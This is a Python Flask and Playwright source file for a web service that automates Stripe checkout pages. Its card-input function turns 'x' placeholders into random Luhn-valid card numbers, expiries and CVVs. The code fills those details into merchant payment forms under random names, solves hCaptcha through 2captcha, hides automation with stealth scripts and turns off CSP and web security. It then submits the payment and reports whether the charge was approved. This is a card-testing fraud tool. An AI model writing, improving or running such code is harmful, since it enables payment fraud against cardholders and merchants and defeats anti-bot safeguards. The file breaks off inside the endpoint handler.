import os
import asyncio
import json
import random
import re
import time
import base64
from datetime import datetime
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout
from playwright._impl._errors import TargetClosedError
from flask import Flask, request, jsonify
from dotenv import load_dotenv
from collections import deque
import httpx
from urllib.parse import parse_qs

load_dotenv()

CONFIG = {
    "RUN_LOCAL": os.getenv('RUN_LOCAL', 'false').lower() == 'true',
    "BROWSERLESS_API_KEY": os.getenv('BROWSERLESS_API_KEY'),
    "TWOCAPTCHA_API_KEY": os.getenv('TWOCAPTCHA_API_KEY'),
    "RESPONSE_TIMEOUT_SECONDS": 30,  # Reduced for speed
    "RETRY_DELAY": 1000,  # Reduced for speed
    "RATE_LIMIT_REQUESTS": 10,  # Increased
    "RATE_LIMIT_WINDOW": 60,
    "MAX_RETRIES": 2,
    "BROWSERLESS_TIMEOUT": 60000,
    "CAPTCHA_TIMEOUT": 120,
    "FAST_MODE": True,  # Enable speed optimizations
    "LOG_REQUEST_BODIES": True  # Enable request body logging
}

app = Flask(__name__)
request_timestamps = deque(maxlen=CONFIG["RATE_LIMIT_REQUESTS"])

# 2Captcha solver class (unchanged)
class TwoCaptchaSolver:
    def __init__(self, api_key):
        self.api_key = api_key
        self.base_url = "http://2captcha.com"
        
    async def solve_hcaptcha(self, sitekey, page_url):
        """Solve HCaptcha using 2captcha service"""
        if not self.api_key:
            print("[CAPTCHA] No 2captcha API key configured")
            return None
            
        print(f"[CAPTCHA] Submitting HCaptcha to 2captcha...")
        
        try:
            async with httpx.AsyncClient() as client:
                submit_data = {
                    'key': self.api_key,
                    'method': 'hcaptcha',
                    'sitekey': sitekey,
                    'pageurl': page_url,
                    'json': 1
                }
                
                response = await client.post(f"{self.base_url}/in.php", data=submit_data)
                result = response.json()
                
                if result.get('status') != 1:
                    print(f"[CAPTCHA] Submit failed: {result.get('error_text', 'Unknown error')}")
                    return None
                
                captcha_id = result.get('request')
                print(f"[CAPTCHA] Task ID: {captcha_id}")
                
                start_time = time.time()
                while time.time() - start_time < CONFIG["CAPTCHA_TIMEOUT"]:
                    await asyncio.sleep(5)
                    
                    check_url = f"{self.base_url}/res.php?key={self.api_key}&action=get&id={captcha_id}&json=1"
                    response = await client.get(check_url)
                    result = response.json()
                    
                    if result.get('status') == 1:
                        token = result.get('request')
                        print(f"[CAPTCHA] ✓ Solved! Token: {token[:30]}...")
                        return token
                    elif result.get('request') == 'CAPCHA_NOT_READY':
                        elapsed = int(time.time() - start_time)
                        print(f"[CAPTCHA] Solving... ({elapsed}s)")
                        continue
                    else:
                        print(f"[CAPTCHA] Error: {result.get('error_text', 'Unknown')}")
                        return None
                
                print("[CAPTCHA] Timeout waiting for solution")
                return None
                
        except Exception as e:
            print(f"[CAPTCHA] Error: {e}")
            return None

# Enhanced captcha detection and handling
class CaptchaHandler:
    @staticmethod
    async def detect_hcaptcha(page):
        """Detect HCaptcha on the page"""
        try:
            hcaptcha_frame = await page.query_selector('iframe[src*="hcaptcha.com"]')
            if hcaptcha_frame:
                print("[CAPTCHA] HCaptcha iframe detected")
                return True
                
            hcaptcha_div = await page.query_selector('div[data-hcaptcha-widget-id]')
            if hcaptcha_div:
                print("[CAPTCHA] HCaptcha widget detected")
                return True
                
            hcaptcha_element = await page.query_selector('.h-captcha')
            if hcaptcha_element:
                print("[CAPTCHA] HCaptcha element detected")
                return True
                
            return False
            
        except Exception as e:
            print(f"[CAPTCHA] Detection error: {e}")
            return False
    
    @staticmethod
    async def get_hcaptcha_sitekey(page):
        """Extract HCaptcha sitekey from the page"""
        try:
            element = await page.query_selector('[data-sitekey]')
            if element:
                sitekey = await element.get_attribute('data-sitekey')
                if sitekey:
                    return sitekey
            
            iframe = await page.query_selector('iframe[src*="hcaptcha.com"]')
            if iframe:
                src = await iframe.get_attribute('src')
                match = re.search(r'sitekey=([a-zA-Z0-9-]+)', src)
                if match:
                    return match.group(1)
            
            scripts = await page.query_selector_all('script')
            for script in scripts:
                content = await script.inner_text()
                match = re.search(r'["\']sitekey["\']\s*:\s*["\']([a-zA-Z0-9-]+)["\']', content)
                if match:
                    return match.group(1)
                    
            print("[CAPTCHA] Could not find sitekey")
            return None
            
        except Exception as e:
            print(f"[CAPTCHA] Sitekey extraction error: {e}")
            return None
    
    @staticmethod
    async def inject_captcha_token(page, token):
        """Inject the solved captcha token into the page"""
        try:
            await page.evaluate(f'''
                () => {{
                    const responseField = document.querySelector('[name="h-captcha-response"]');
                    if (responseField) {{
                        responseField.value = '{token}';
                        responseField.innerHTML = '{token}';
                    }}
                    
                    const gResponseField = document.querySelector('[name="g-recaptcha-response"]');
                    if (gResponseField) {{
                        gResponseField.value = '{token}';
                        gResponseField.innerHTML = '{token}';
                    }}
                    
                    if (typeof hcaptcha !== 'undefined' && hcaptcha.execute) {{
                        window.hcaptcha.execute();
                    }}
                    
                    if (window.hcaptchaCallback) {{
                        window.hcaptchaCallback('{token}');
                    }}
                    
                    if (window.onHcaptchaCallback) {{
                        window.onHcaptchaCallback('{token}');
                    }}
                }}
            ''')
            
            await page.evaluate(f'''
                () => {{
                    const event = new CustomEvent('hcaptcha-verified', {{
                        detail: {{ response: '{token}' }}
                    }});
                    document.dispatchEvent(event);
                }}
            ''')
            
            print("[CAPTCHA] ✓ Token injected")
            return True
            
        except Exception as e:
            print(f"[CAPTCHA] Injection error: {e}")
            return False

# Enhanced Universal Response Analyzer with Request Body Parsing
class UniversalResponseAnalyzer:
    @staticmethod
    def parse_request_body(body_data, content_type):
        """Parse request body based on content type"""
        if not body_data:
            return None
            
        try:
            # JSON content
            if 'application/json' in content_type:
                return json.loads(body_data)
            
            # Form data
            elif 'application/x-www-form-urlencoded' in content_type:
                parsed = parse_qs(body_data)
                # Convert single-item lists to strings for readability
                return {k: v[0] if len(v) == 1 else v for k, v in parsed.items()}
            
            # Multipart form data
            elif 'multipart/form-data' in content_type:
                # Basic parsing - could be enhanced
                return {"raw": body_data[:500], "type": "multipart"}
            
            # Text or other
            else:
                return body_data[:1000] if len(body_data) > 1000 else body_data
                
        except Exception as e:
            return {"parse_error": str(e), "raw": body_data[:500] if body_data else ""}
    
    @staticmethod
    def analyze_request(url, method, headers, body_text, result_dict):
        """Analyze outgoing API request"""
        domain = url.split('/')[2] if '/' in url else url
        endpoint = url.split('?')[0] if '?' in url else url
        
        # Parse request body
        content_type = headers.get('content-type', '') if headers else ''
        parsed_body = UniversalResponseAnalyzer.parse_request_body(body_text, content_type)
        
        # Store request data
        request_data = {
            "type": "request",
            "url": url,
            "domain": domain,
            "endpoint": endpoint,
            "method": method,
            "timestamp": datetime.now().isoformat(),
            "headers": dict(headers) if headers else {},
            "body": parsed_body,
            "body_size": len(body_text) if body_text else 0
        }
        
        result_dict["raw_api_calls"].append(request_data)
        
        # Log important requests with body
        is_payment_api = any(term in url.lower() for term in [
            'stripe', 'payment', 'checkout', 'charge', 'token', 
            'card', 'pay', 'billing', 'purchase', 'transaction', 'order'
        ])
        
        if is_payment_api or method in ['POST', 'PUT', 'PATCH']:
            print(f"\n[API-REQUEST-{method}] {domain}")
            print(f"  URL: {endpoint[:80]}...")
            if parsed_body:
                body_str = json.dumps(parsed_body) if isinstance(parsed_body, dict) else str(parsed_body)
                print(f"  BODY: {body_str[:300]}...")
                
                # Log specific important fields if present
                if isinstance(parsed_body, dict):
                    important_fields = ['card', 'number', 'email', 'amount', 'currency', 'payment_method', 'client_secret']
                    for field in important_fields:
                        if field in parsed_body:
                            print(f"    {field}: {str(parsed_body[field])[:100]}")
    
    @staticmethod
    def analyze_response(url, status, headers, body_text, result_dict):
        """Analyze incoming API response"""
        domain = url.split('/')[2] if '/' in url else url
        endpoint = url.split('?')[0] if '?' in url else url
        
        # Log everything
        response_data = {
            "type": "response",
            "url": url,
            "domain": domain,
            "endpoint": endpoint,
            "status": status,
            "timestamp": datetime.now().isoformat(),
            "headers": dict(headers) if headers else {},
            "size": len(body_text) if body_text else 0
        }
        
        # Try to parse as JSON
        try:
            data = json.loads(body_text)
            response_data["data"] = data
            response_data["content_type"] = "json"
        except:
            response_data["data"] = body_text[:1000] if body_text else ""
            response_data["content_type"] = "text"
        
        # Store in raw responses
        result_dict["raw_api_calls"].append(response_data)
        
        # Log based on importance
        is_payment_api = any(term in url.lower() for term in [
            'stripe', 'payment', 'checkout', 'charge', 'token', 
            'card', 'pay', 'billing', 'purchase', 'transaction'
        ])
        
        if is_payment_api:
            print(f"\n[API-RESPONSE-{status}] {domain}")
            print(f"  URL: {endpoint[:80]}...")
            if response_data["content_type"] == "json":
                print(f"  BODY: {json.dumps(data)[:300]}...")
        elif status >= 400:
            print(f"[API-ERROR-{status}] {domain} -> {endpoint[:50]}...")
        
        # Analyze for payment success (works for any payment processor)
        if response_data["content_type"] == "json":
            data = response_data["data"]
            
            # Generic success indicators
            success_indicators = [
                data.get('status') in ['succeeded', 'success', 'complete', 'paid', 'approved'],
                data.get('result') in ['success', 'approved'],
                data.get('payment_status') in ['paid', 'complete', 'success'],
                data.get('transaction_status') in ['approved', 'success'],
                data.get('approved') == True,
                data.get('paid') == True,
                data.get('success') == True,
                'success_url' in data,
                'confirmation' in data,
                'receipt' in data
            ]
            
            if any(success_indicators):
                result_dict["payment_confirmed"] = True
                result_dict["success"] = True
                result_dict["message"] = f"Payment confirmed via {domain}"
                print(f"[✓✓✓ PAYMENT CONFIRMED] {domain} - {data.get('status', 'success')}")
            
            # Check for errors
            error_fields = ['error', 'error_message', 'message', 'decline_reason', 'failure_reason']
            for field in error_fields:
                if field in data and data[field]:
                    result_dict["error"] = str(data[field])
                    result_dict["success"] = False
                    print(f"[ERROR] {field}: {data[field]}")
                    break
            
            # 3DS detection
            if any(term in str(data).lower() for term in ['3d', 'authentication', 'verify', 'challenge']):
                result_dict["requires_3ds"] = True
                print("[3DS] Authentication required")

def rate_limit_check():
    now = time.time()
    while request_timestamps and request_timestamps[0] < now - CONFIG["RATE_LIMIT_WINDOW"]:
        request_timestamps.popleft()
    
    if len(request_timestamps) >= CONFIG["RATE_LIMIT_REQUESTS"]:
        oldest = request_timestamps[0]
        wait_time = CONFIG["RATE_LIMIT_WINDOW"] - (now - oldest)
        return False, wait_time
    
    request_timestamps.append(now)
    return True, 0

# Card utilities (keeping existing functions)
def luhn_algorithm(number_str):
    total = 0
    reverse_digits = number_str[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if (i % 2) == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def complete_luhn(base):
    for d in range(10):
        candidate = base + str(d)
        if luhn_algorithm(candidate):
            return candidate
    return None

def get_card_length(bin_str):
    first_two = bin_str[:2] if len(bin_str) >= 2 else ""
    return 15 if first_two in ['34', '37'] else 16

def get_cvv_length(card_number):
    return 4 if len(card_number) == 15 else 3

def random_digit():
    return str(random.randint(0, 9))

def generate_card_from_pattern(pattern):
    clean_pattern = re.sub(r'[^0-9x]', '', pattern, flags=re.IGNORECASE)
    card_length = get_card_length(clean_pattern.replace('x', '0'))
    
    result = ''
    for char in clean_pattern:
        if len(result) >= card_length - 1:
            break
        result += random_digit() if char.lower() == 'x' else char
    
    while len(result) < card_length - 1:
        result += random_digit()
    
    result = result[:card_length - 1]
    return complete_luhn(result) or result + '0'

def process_card_with_placeholders(number, month, year, cvv):
    processed_number = generate_card_from_pattern(number) if 'x' in number.lower() else number
    processed_month = str(random.randint(1, 12)).zfill(2) if 'x' in month.lower() else month.zfill(2)
    
    current_year = datetime.now().year
    if 'x' in year.lower():
        processed_year = str(random.randint(current_year + 1, current_year + 6))
    elif len(year) == 2:
        processed_year = '20' + year
    else:
        processed_year = year
    
    cvv_length = get_cvv_length(processed_number)
    processed_cvv = ''.join([random_digit() for _ in range(cvv_length)]) if 'x' in cvv.lower() else cvv
    
    return {
        "number": processed_number,
        "month": processed_month,
        "year": processed_year,
        "cvv": processed_cvv
    }

def process_card_input(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        return None
    return process_card_with_placeholders(*parts)

def generate_random_name():
    first_names = ['Alex', 'Jordan', 'Taylor', 'Morgan', 'Casey', 'Riley', 'Avery', 'Quinn', 'Sage', 'Parker']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
    return f"{random.choice(first_names)} {random.choice(last_names)}"

async def safe_wait(page, ms):
    try:
        await page.wait_for_timeout(ms)
        return True
    except:
        return False

async def wait_for_network_idle(page, timeout=5000):
    """Wait for network to be idle"""
    try:
        await page.wait_for_load_state('networkidle', timeout=timeout)
        return True
    except:
        return False

async def run_stripe_automation(url, cc_string, email=None):
    card = process_card_input(cc_string)
    if not card:
        return {"error": "Invalid card format"}
    
    email = email or f"test{random.randint(1000,9999)}@example.com"
    random_name = generate_random_name()
    
    print(f"\n{'='*80}")
    print(f"[START] {datetime.now().strftime('%H:%M:%S')}")
    print(f"[CARD] {card['number']} | {card['month']}/{card['year']} | {card['cvv']}")
    print(f"[EMAIL] {email}")
    print(f"[MODE] {'FAST' if CONFIG['FAST_MODE'] else 'NORMAL'}")
    print(f"[REQUEST BODY LOGGING] {'ON' if CONFIG['LOG_REQUEST_BODIES'] else 'OFF'}")
    print('='*80)
    
    stripe_result = {
        "status": "pending",
        "raw_api_calls": [],  # Combined requests and responses
        "payment_confirmed": False,
        "token_created": False,
        "payment_method_created": False,
        "payment_intent_created": False,
        "success_url": None,
        "requires_3ds": False,
        "captcha_solved": False,
        "network_requests": 0,
        "network_errors": 0
    }
    
    analyzer = UniversalResponseAnalyzer()
    captcha_handler = CaptchaHandler()
    captcha_solver = TwoCaptchaSolver(CONFIG.get("TWOCAPTCHA_API_KEY"))
    
    async with async_playwright() as p:
        browser = None
        context = None
        page = None
        payment_submitted = False
        
        try:
            # Browser setup with full capabilities
            browser_args = [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-blink-features=AutomationControlled',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process',
                '--allow-running-insecure-content',
                '--disable-popup-blocking',
                '--disable-content-security-policy'
            ]
            
            if CONFIG["RUN_LOCAL"]:
                browser = await p.chromium.launch(
                    headless=False, 
                    slow_mo=50 if CONFIG['FAST_MODE'] else 100,
                    args=browser_args
                )
                print("[BROWSER] Local")
            else:
                print("[BROWSER] Connecting to Browserless...")
                browser_url = f"wss://production-sfo.browserless.io/chromium/playwright?token={CONFIG['BROWSERLESS_API_KEY']}&timeout={CONFIG['BROWSERLESS_TIMEOUT']}"
                try:
                    browser = await p.chromium.connect(browser_url, timeout=30000)
                    print("[BROWSER] ✓ Connected")
                except Exception as e:
                    print(f"[BROWSER] Failed: {e}")
                    browser = await p.chromium.launch(headless=True, args=browser_args)
            
            # Enhanced context with all permissions
            context = await browser.new_context(
                viewport={'width': 1920, 'height': 1080},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                locale='en-US',
                timezone_id='America/New_York',
                ignore_https_errors=True,
                bypass_csp=True,
                java_script_enabled=True,
                permissions=['geolocation', 'notifications', 'camera', 'microphone'],
                extra_http_headers={
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate, br'
                }
            )
            
            # Add comprehensive stealth scripts
            await context.add_init_script("""
                // Remove webdriver flag
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => false,
                });
                
                // Add plugins
                Object.defineProperty(navigator, 'plugins', {
                    get: () => [1, 2, 3, 4, 5],
                });
                
                // Chrome specific
                window.chrome = {
                    runtime: {},
                    loadTimes: function() {},
                    csi: function() {},
                    app: {}
                };
                
                // Permission overrides
                const originalQuery = window.navigator.permissions.query;
                window.navigator.permissions.query = (parameters) => (
                    parameters.name === 'notifications' ?
                        Promise.resolve({ state: Notification.permission }) :
                        originalQuery(parameters)
                );
                
                // Ensure all iframes load properly
                window.addEventListener('message', function(e) {
                    console.log('Frame message:', e.origin, e.data);
                }, false);
            """)
            
            page = await context.new_page()
            
            # Comprehensive network interception for ALL requests
            async def capture_request(request):
                try:
                    stripe_result["network_requests"] += 1
                    url = request.url
                    method = request.method
                    headers = request.headers
                    
                    # Capture request body if available
                    body_text = None
                    try:
                        if method in ['POST', 'PUT', 'PATCH']:
                            body = request.post_data
                            if body:
                                body_text = body
                                # Analyze the request
                                analyzer.analyze_request(url, method, headers, body_text, stripe_result)
                    except:
                        pass
                    
                    # Log important requests even without body
                    if not body_text and (method in ['POST', 'PUT', 'PATCH'] or 'api' in url.lower()):
                        print(f"[REQUEST-{method}] {url[:80]}...")
                        
                except Exception as e:
                    print(f"[REQUEST-ERROR] {e}")
            
            async def capture_response(response):
                try:
                    url = response.url
                    status = response.status
                    headers = response.headers
                    
                    # Capture ALL responses, not just JSON
                    try:
                        content_type = headers.get('content-type', '')
                        body = await response.body()
                        text = body.decode('utf-8', errors='ignore') if body else ""
                        
                        # Analyze everything
                        analyzer.analyze_response(url, status, headers, text, stripe_result)
                        
                    except Exception as e:
                        # Still log even if we can't get body
                        analyzer.analyze_response(url, status, headers, "", stripe_result)
                        
                except Exception as e:
                    stripe_result["network_errors"] += 1
            
            async def capture_request_failed(request):
                stripe_result["network_errors"] += 1
                print(f"[REQUEST-FAILED] {request.url[:80]}... - {request.failure}")
            
            # Attach all network handlers
            page.on("request", capture_request)
            page.on("response", capture_response)
            page.on("requestfailed", capture_request_failed)
            
            # Route interception for deeper request body capture
            await page.route('**/*', lambda route, request: route.continue_())
            
            # Console logging for JS errors/info
            page.on("console", lambda msg: print(f"[CONSOLE-{msg.type}] {msg.text[:200]}") if msg.type in ['error', 'warning'] else None)
            page.on("pageerror", lambda error: print(f"[PAGE-ERROR] {error}"))
            
            # Navigate with full loading
            print("[NAV] Loading page...")
            await page.goto(url, wait_until="networkidle", timeout=40000)
            print("[NAV] ✓ Page loaded")
            
            # Wait for all dynamic content
            await wait_for_network_idle(page, 5000)
            
            # Ensure all frames are loaded
            frames = page.frames
            print(f"[FRAMES] Total frames: {len(frames)}")
            for idx, frame in enumerate(frames):
                try:
                    frame_url = frame.url
                    if frame_url and frame_url != 'about:blank':
                        print(f"[FRAME-{idx}] {frame_url[:80]}...")
                except:
                    pass
            
            # Wait for any lazy-loaded content
            await safe_wait(page, 2000 if CONFIG['FAST_MODE'] else 3000)
            
            print(f"[NETWORK] {stripe_result['network_requests']} requests captured so far")
            print(f"[API CALLS] {len(stripe_result['raw_api_calls'])} API calls logged")
            
            # Check for HCaptcha
            has_captcha = await captcha_handler.detect_hcaptcha(page)
            if has_captcha:
                print("[CAPTCHA] HCaptcha detected on page")
                sitekey = await captcha_handler.get_hcaptcha_sitekey(page)
                
                if sitekey and CONFIG.get("TWOCAPTCHA_API_KEY"):
                    print(f"[CAPTCHA] Sitekey found: {sitekey}")
                    token = await captcha_solver.solve_hcaptcha(sitekey, page.url)
                    
                    if token:
                        await captcha_handler.inject_captcha_token(page, token)
                        stripe_result["captcha_solved"] = True
                        await safe_wait(page, 1000 if CONFIG['FAST_MODE'] else 2000)
                        print("[CAPTCHA] ✓ Solved and injected")
            
            # Fill email with multiple strategies
            print("[FILL] Email...")
            email_filled = False
            email_selectors = [
                'input[type="email"]',
                'input[name="email"]',
                '#email',
                'input[placeholder*="email" i]',
                'input[id*="email" i]',
                'input[autocomplete="email"]'
            ]
            
            for selector in email_selectors:
                if email_filled:
                    break
                try:
                    elements = await page.query_selector_all(selector)
                    for element in elements:
                        if await element.is_visible():
                            await element.scroll_into_view_if_needed()
                            await element.click()
                            await element.fill("")
                            await element.type(email, delay=20 if CONFIG['FAST_MODE'] else 50)
                            email_filled = True
                            print(f"[EMAIL] ✓ {email}")
                            break
                except:
                    continue
            
            await safe_wait(page, 500 if CONFIG['FAST_MODE'] else 1500)
            
            # Enhanced card filling with all frames
            print("[FILL] Card details...")
            filled_status = {"card": False, "expiry": False, "cvc": False, "name": False}
            
            # Fill name
            try:
                name_selectors = [
                    'input[name*="name" i]:not([name*="email"])',
                    'input[placeholder*="name" i]:not([placeholder*="email"])',
                    '#cardholder-name',
                    'input[autocomplete*="name"]'
                ]
                for selector in name_selectors:
                    if filled_status["name"]:
                        break
                    elements = await page.query_selector_all(selector)
                    for element in elements:
                        if await element.is_visible():
                            await element.click()
                            await element.fill(random_name)
                            filled_status["name"] = True
                            print(f"[NAME] ✓ {random_name}")
                            break
            except:
                pass
            
            # Get all frames including nested
            all_frames = []
            def collect_frames(frame):
                all_frames.append(frame)
                for child in frame.child_frames:
                    collect_frames(child)
            
            collect_frames(page.main_frame)
            stripe_frames = [f for f in all_frames if 'stripe' in f.url.lower() or 'checkout' in f.url.lower()]
            
            print(f"[FRAMES] {len(all_frames)} total, {len(stripe_frames)} payment frames")
            
            # Try filling in all relevant frames
            for attempt in range(2):  # Reduced attempts for speed
                if all([filled_status["card"], filled_status["expiry"], filled_status["cvc"]]):
                    break
                    
                print(f"[FILL] Card attempt {attempt + 1}")
                
                # Try main page first
                frames_to_check = [page] + stripe_frames
                
                for frame_or_page in frames_to_check:
                    try:
                        # Card number
                        if not filled_status["card"]:
                            card_selectors = [
                                'input[placeholder*="1234" i]',
                                'input[placeholder*="card" i]',
                                'input[name*="card" i]',
                                'input[autocomplete="cc-number"]',
                                'input[data-elements-stable-field-name="cardNumber"]',
                                '#cardNumber'
                            ]
                            for selector in card_selectors:
                                try:
                                    element = await frame_or_page.query_selector(selector)
                                    if element and await element.is_visible():
                                        await element.scroll_into_view_if_needed()
                                        await element.click()
                                        await element.fill("")
                                        typing_delay = 20 if CONFIG['FAST_MODE'] else random.randint(30, 80)
                                        for digit in card['number']:
                                            await element.type(digit, delay=typing_delay)
                                        filled_status["card"] = True
                                        print(f"[CARD] ✓ {card['number']}")
                                        break
                                except:
                                    continue
                        
                        # Expiry
                        if not filled_status["expiry"]:
                            expiry_selectors = [
                                'input[placeholder*="mm" i]',
                                'input[placeholder*="exp" i]',
                                'input[name*="exp" i]',
                                'input[autocomplete="cc-exp"]',
                                'input[data-elements-stable-field-name="cardExpiry"]',
                                '#cardExpiry'
                            ]
                            for selector in expiry_selectors:
                                try:
                                    element = await frame_or_page.query_selector(selector)
                                    if element and await element.is_visible():
                                        await element.scroll_into_view_if_needed()
                                        await element.click()
                                        await element.fill("")
                                        exp_string = f"{card['month']}/{card['year'][-2:]}"
                                        typing_delay = 20 if CONFIG['FAST_MODE'] else random.randint(30, 80)
                                        for char in exp_string:
                                            await element.type(char, delay=typing_delay)
                                        filled_status["expiry"] = True
                                        print(f"[EXPIRY] ✓ {exp_string}")
                                        break
                                except:
                                    continue
                        
                        # CVC
                        if not filled_status["cvc"]:
                            cvc_selectors = [
                                'input[placeholder*="cvc" i]',
                                'input[placeholder*="cvv" i]',
                                'input[placeholder*="security" i]',
                                'input[name*="cvc" i]',
                                'input[name*="cvv" i]',
                                'input[autocomplete="cc-csc"]',
                                'input[data-elements-stable-field-name="cardCvc"]',
                                '#cardCvc'
                            ]
                            for selector in cvc_selectors:
                                try:
                                    element = await frame_or_page.query_selector(selector)
                                    if element and await element.is_visible():
                                        await element.scroll_into_view_if_needed()
                                        await element.click()
                                        await element.fill("")
                                        typing_delay = 20 if CONFIG['FAST_MODE'] else random.randint(30, 80)
                                        for digit in card['cvv']:
                                            await element.type(digit, delay=typing_delay)
                                        filled_status["cvc"] = True
                                        print(f"[CVC] ✓ {card['cvv']}")
                                        break
                                except:
                                    continue
                    except Exception as e:
                        print(f"[FRAME] Error: {str(e)[:100]}")
                        continue
                
                if not all([filled_status["card"], filled_status["expiry"], filled_status["cvc"]]):
                    await safe_wait(page, 500 if CONFIG['FAST_MODE'] else 1000)
            
            print(f"[STATUS] Filled: {filled_status}")
            print(f"[NETWORK] {stripe_result['network_requests']} requests captured")
            print(f"[API CALLS] {len(stripe_result['raw_api_calls'])} API calls logged")
            
            # Wait for validation
            await safe_wait(page, 1500 if CONFIG['FAST_MODE'] else 3000)
            await wait_for_network_idle(page, 3000)
            
            # Check for captcha again
            has_captcha_after = await captcha_handler.detect_hcaptcha(page)
            if has_captcha_after and not stripe_result["captcha_solved"]:
                print("[CAPTCHA] HCaptcha appeared after filling")
                sitekey = await captcha_handler.get_hcaptcha_sitekey(page)
                
                if sitekey and CONFIG.get("TWOCAPTCHA_API_KEY"):
                    token = await captcha_solver.solve_hcaptcha(sitekey, page.url)
                    if token:
                        await captcha_handler.inject_captcha_token(page, token)
                        stripe_result["captcha_solved"] = True
                        await safe_wait(page, 1000)
            
            # Submit payment with enhanced selectors
            print("[SUBMIT] Looking for submit button...")
            submit_selectors = [
                'button[type="submit"]:visible',
                'button:has-text("pay"):visible',
                'button:has-text("submit"):visible',
                'button:has-text("complete"):visible',
                'button:has-text("confirm"):visible',
                'button:has-text("place order"):visible',
                'button:has-text("checkout"):visible',
                'button.btn-primary:visible',
                'button.submit-button:visible',
                'input[type="submit"]:visible'
            ]
            
            for selector in submit_selectors:
                try:
                    btn = page.locator(selector).first
                    if await btn.count() > 0:
                        is_disabled = await btn.get_attribute('disabled')
                        if is_disabled is None or is_disabled == 'false':
                            await btn.scroll_into_view_if_needed()
                            await btn.click()
                            payment_submitted = True
                            print(f"[SUBMIT] ✓ Clicked: {selector}")
                            break
                except:
                    continue
            
            if not payment_submitted:
                await page.keyboard.press('Enter')
                payment_submitted = True
                print("[SUBMIT] ✓ Enter key pressed")
            
            # Wait for payment processing
            print(f"[WAIT] Processing payment ({10 if CONFIG['FAST_MODE'] else 15}s)...")
            await safe_wait(page, 10000 if CONFIG['FAST_MODE'] else 15000)
            await wait_for_network_idle(page, 5000)
            
            # Monitor for response
            print("[MONITORING] Waiting for confirmation...")
            start_time = time.time()
            max_wait = CONFIG["RESPONSE_TIMEOUT_SECONDS"]
            last_call_count = 0
            
            while time.time() - start_time < max_wait:
                elapsed = time.time() - start_time
                
                current_calls = len(stripe_result['raw_api_calls'])
                if current_calls > last_call_count:
                    print(f"[MONITOR] {current_calls} API calls captured, {stripe_result['network_requests']} total requests")
                    last_call_count = current_calls
                
                if stripe_result.get("payment_confirmed"):
                    print("[✓✓✓ SUCCESS] Payment confirmed!")
                    break
                
                if stripe_result.get("error"):
                    print(f"[ERROR] {stripe_result['error']}")
                    break
                
                if stripe_result.get("requires_3ds"):
                    print("[3DS] Authentication required")
                    break
                
                # Check URL for success
                try:
                    current_url = page.url
                    success_url = stripe_result.get("success_url")
                    
                    if success_url and current_url.startswith(success_url):
                        print(f"[✓ SUCCESS] Redirected to: {current_url[:80]}")
                        stripe_result["payment_confirmed"] = True
                        stripe_result["success"] = True
                        break
                    
                    if any(x in current_url.lower() for x in ['success', 'thank', 'complete', 'confirmed', 'order']):
                        print(f"[SUCCESS PAGE] {current_url[:80]}")
                        stripe_result["payment_confirmed"] = True
                        stripe_result["success"] = True
                        break
                except:
                    pass
                
                # Keep alive
                if int(elapsed) % 5 == 0 and int(elapsed) > 0:
                    try:
                        await page.evaluate('1')
                    except:
                        print("[WARNING] Browser disconnected")
                        break
                
                await asyncio.sleep(0.5)
            
            print(f"\n[SUMMARY]")
            print(f"  - Total Requests: {stripe_result['network_requests']}")
            print(f"  - API Calls Captured: {len(stripe_result['raw_api_calls'])}")
            print(f"  - Network Errors: {stripe_result['network_errors']}")
            print(f"  - Captcha: {'Solved' if stripe_result['captcha_solved'] else 'Not required'}")
            
            # Separate requests and responses for final output
            requests_only = [call for call in stripe_result['raw_api_calls'] if call.get('type') == 'request']
            responses_only = [call for call in stripe_result['raw_api_calls'] if call.get('type') == 'response']
            
            # Build final response
            base_response = {
                "card": f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}",
                "captcha_solved": stripe_result.get("captcha_solved"),
                "network_stats": {
                    "total_requests": stripe_result['network_requests'],
                    "api_calls": len(stripe_result['raw_api_calls']),
                    "requests_with_body": len(requests_only),
                    "responses": len(responses_only),
                    "errors": stripe_result['network_errors']
                },
                "raw_requests": requests_only,  # Separate requests
                "raw_responses": responses_only,  # Separate responses
                "all_api_calls": stripe_result['raw_api_calls']  # Combined chronological order
            }
            
            if stripe_result.get("payment_confirmed"):
                return {
                    **base_response,
                    "success": True,
                    "message": stripe_result.get("message", "Payment successful"),
                    "payment_intent_id": stripe_result.get("payment_intent_id"),
                    "token_id": stripe_result.get("token_id"),
                    "payment_method_id": stripe_result.get("payment_method_id")
                }
            elif stripe_result.get("requires_3ds"):
                return {
                    **base_response,
                    "success": False,
                    "requires_3ds": True,
                    "message": "3D Secure authentication required"
                }
            elif stripe_result.get("error"):
                return {
                    **base_response,
                    "success": False,
                    "error": stripe_result["error"],
                    "decline_code": stripe_result.get("decline_code")
                }
            else:
                return {
                    **base_response,
                    "success": False,
                    "message": "Payment not confirmed - check raw API calls",
                    "details": {
                        "filled": filled_status,
                        "payment_submitted": payment_submitted
                    }
                }
                
        except Exception as e:
            print(f"[ERROR] {str(e)}")
            return {
                "error": f"Automation failed: {str(e)}",
                "captcha_solved": stripe_result.get("captcha_solved", False),
                "all_api_calls": stripe_result.get("raw_api_calls", []),
                "network_stats": {
                    "total_requests": stripe_result.get('network_requests', 0),
                    "api_calls": len(stripe_result.get('raw_api_calls', [])),
                    "errors": stripe_result.get('network_errors', 0)
                }
            }
            
        finally:
            try:
                if page:
                    await page.close()
                if context:
                    await context.close()
                if browser:
                    await browser.close()
                print("[CLEANUP] ✓")
            except:
                pass

@app.route('/hrkXstripe', methods=['GET'])
def stripe_endpoint():
    can_proceed, wait_time = rate_limit_check()
    if not can_proceed:
        return jsonify({"error": "Rate limit exceeded", "retry_after": f"{wait_time:.1f}s"}), 429
    
    url = request.args.get('url')
